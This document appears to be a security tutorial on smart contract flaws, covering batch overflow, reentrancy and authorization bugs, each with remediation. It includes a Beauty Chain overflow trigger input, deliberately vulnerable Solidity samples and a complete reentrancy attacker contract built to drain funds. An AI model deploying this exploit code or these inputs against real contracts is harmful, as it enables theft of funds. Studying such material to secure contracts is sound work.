## Vulnerabilities

### Human errors

When tested other types of application, an attacker does not generally have access to the backand code accordingly cannot know the names of the parameters to be used, the hidden functions etc. This is not entirely true but the fact that it is not an immediate aspect provides a false sense of security.
For smart contracts, however, this cannot be applied. The code is always public, a function can be private and not directly accessible but it is still readable by anyone.


A smart contract has a cost. A longer code with variables of certain types rather than others increases the expense of setting up the contract on a blockchain. Consequently, programmers try to optimize the code as much as possible. This can bring less safe development to be able to save on costs.


Furthermore, once a smart contract is active it is impossible to make changes. For this reason it is necessary to perform careful security checks to verify that everything is safe.


### Batch Overflow

This happens because the arithmetic value of the operation exceeds the maximum size of the variable value type. An example: the variable `amount` is `uint256`. It supports numeric values from 0 to 2 ^ 256. This means that a value like `0x8000000000000000000000000000000000000000000000000000000000000000` corresponding to the decimal value `57896044618658097711785492504343953926634992332820282019728792003956564819968` received in the input for the variable `amount` would trigger a Batch Overflow since it exceeds the maximum value supported.

A real example of this attack: Beauty Chain exploit https://etherscan.io/tx/0xad89ff16fd1ebe3a0a7cf4ed282302c06626c1af33221ebe0d3a470aba4a660f. Beauty Chain smart contract code: https://etherscan.io/address/0xc5d105e63711398af9bbff092d4b6769c82f793d#code.

The function vulnerable to a Batch Overflow on Beauty Chain is `batchTransfer`.

```
//SPDX-License-Identifier: UNLICENSED
pragma solidity 0.6.6;

contract BEC_Target{

mapping(address => uint) balances;

function batchTransfer(address[] memory _receivers, uint256 _value) public payable returns (bool) {
    uint cnt = _receivers.length;
    uint256 amount = uint256(cnt) * _value;
    require(cnt > 0 && cnt <= 20);
    require(_value > 0 && balances[msg.sender] >= amount);

    balances[msg.sender] = balances[msg.sender] - amount;
    for (uint i = 0; i < cnt; i++) {
        balances[_receivers[i]] = balances[_receivers[i]] + _value;
    }
    return true;
  }

    function deposit() public payable{
        balances[msg.sender] += msg.value;       
    }

    function getBalance() public view returns(uint){
        return balances[msg.sender];
    }

}
```

An input like `["<ADDR_1>","<ADDR_2>"], 0x8000000000000000000000000000000000000000000000000000000000000000` for the function `batchTransfer` would trigger this vulnerability.

**Remediation**

As seen previously, the problem lies in the variable `amount` which, having no input controls, is subject to a Batch Overflow. The solution to this problem is to implement a check on the value received as an input. An example is the following:

```
if (a == 0) return (true, 0);
uint256 c = a * b;
if (c / a != b) return (false, 0);
return (true, c);
```

The variable `uint256 c` is the multiplication of the address of recipient `a` by the value of the number of tokens that must receive `b`, giving the result `c`. To make sure that the value `c` is not Overfloded, we check that the division of `c` / `a` is equal to `b`. If not, it would indicate that the value `c` makes no sense and has been compromised.

To fix this vulnerability, and other integer overflows and underflows, the [SafeMath by OpenZeppelin library](https://github.com/OpenZeppelin/openzeppelin-contracts) can be used. SafeMath provides four functions: Add, Subtract, Multiply, Divide. Each of them performs a check on the operation to verify that the data received in input is valid.

### Reentrancy Vulnerabilities

A Reentrancy vulnerability is a type of attack to drain the bit-by-bit liquidity of a contract with an insecure code-writing pattern.

An incorrect flow first verifies that the user has a sufficient balance to execute the transaction, then sends the funds to the user. Only if the operation is successful, at that point, does it update the user's balance. The problem arises because if a contract invokes this operation instead of a user, it can create code that generates a loop. This means that an attacker can invoke the withdrawal function many times because it is the same balance that is checked as the initial value.

An example:

```
//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.6;
    
contract simpleReentrancy {
	mapping (address => uint) private balances;
	
	function deposit() public payable  {
		require((balances[msg.sender] + msg.value) >= balances[msg.sender]);
		balances[msg.sender] += msg.value;
	}
 
	function withdraw(uint withdrawAmount) public returns (uint) {
		require(withdrawAmount <= balances[msg.sender]);
		msg.sender.call.value(withdrawAmount)("");

		balances[msg.sender] -= withdrawAmount;
		return balances[msg.sender];
	}
    
	function getBalance() public view returns (uint){
		return balances[msg.sender];
	}
}
```

The vulnerable function is `withdraw`. As you can see, first it checks that the balance is sufficient, then the withdrawal is made and only after this step the balance is being updated.

1. An attacker deposits a small amount into his account and calls the withdraw function of the contract by withdrawing an amount less than his balance;
2. The victim contract interacts with the attacker's contract trying to provide the requested funds;
3. The attacker will respond with a fallback function that will call the withdrawal another time, but the victim contract has not yet updated the user's balance so it will keep the initial one despite the previous operation.

An example code of a malicious smart contract is as follows:

```
//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.6;

interface targetInterface{
	function deposit() external payable; 
	function withdraw(uint withdrawAmount) external; 
}
 
contract simpleReentrancyAttack{
	targetInterface bankAddress = targetInterface(TARGET_ADDRESS_HERE); 
	uint amount = 1 ether; 
 
	function deposit() public payable{
		bankAddress.deposit.value(amount)();
	}

	function attack() public payable{
		bankAddress.withdraw(amount); 
	}

	function retrieveStolenFunds() public {
		msg.sender.transfer(address(this).balance);
	}

	fallback () external payable{ 
		if (address(bankAddress).balance >= amount){
			bankAddress.withdraw(amount);
		}   
	}
}
```

1. This contract checks that the balance on the smart contract is greater than 1 ETH. Call the external withdraw function of the victim's smart contract, which will provide the requested funds;
2. Not having received further instructions after receiving the funds, the fallback function is triggered immediately. When the latter is activated, the smart contract has not yet updated the attacker's balance, so it will proceed to carry out the withdrawal operation with the previous balance;
3. The malicious smart contract receives the funds and no further instructions, so it repeats the step 2.


**Remediation**

Implement Checks Effects Interactions Pattern: A secure code-writing pattern that prevents an attacker from creating loops that allow him to re-enter the contract multiple times without blocking.

- Verify that the requirements are met before continuing the execution;
- Update balances and make changes before interacting with an external actor;
- Finally, after the transaction has been validated and the changes have been made, interactions with the external entity are allowed.

### Authorization issues

A function can be: External, Public, Internal or Private. Defining this aspect is very important as there is a risk of allowing potentially harmful operations or giving administrative privileges to any user.

A first example is the following `withdraw` function. As you can see, it does not check if the user requesting a certain amount has the funds to request the withdrawal.

```
function withdraw(uint amount) public payable {
	msg.sender.transfer(amount);
}
```

Another example is the following `kill()` function. The `kill` function contains the method `selfdestruct` that allows to withdraw all the contract funds in the user's balance which activates the functionality and invalidates the smart contract. Since this function is public, any user can have access to it.

```
function kill() public {
	selfdestruct(msg.sender);
}
```

An example of how problematic this can become:

![ETH-noob-calls-kill-function](https://x)


**Remediation**

A solution for the first scenario is very simple, it just needs a check to be implemented.

For the second example, you can add the following modifier. In the modifier there is the condition that whoever is carrying out the function must be the owner of the contract.

```
address owner;

modifier OnlyOwner(){
    require(msg.sender == owner);
    
    _;

}
```

So the fixed code would look like this:

```
mapping (address =>uint) balances;
    
address owner;
    
modifier OnlyOwner(){
    require(msg.sender == owner);
    
    _;

}

function kill() public OnlyOwner{
		selfdestruct(msg.sender);
}
```

### Use of components with known vulnerabilities

An outdated compiler with known vulnerabilities may have been used to compile the smart contract. Another possibility is that libraries with known vulnerabilities have been imported.

Another case that I happened to see in the wild is the `import` linking libraries from github then removed. For example, an attempt was made to import SafeMath but the now outdated version was no longer present in the specified endpoint. In this case, some smart contract developers prefer to deploy without having imports that reference external enpoints.
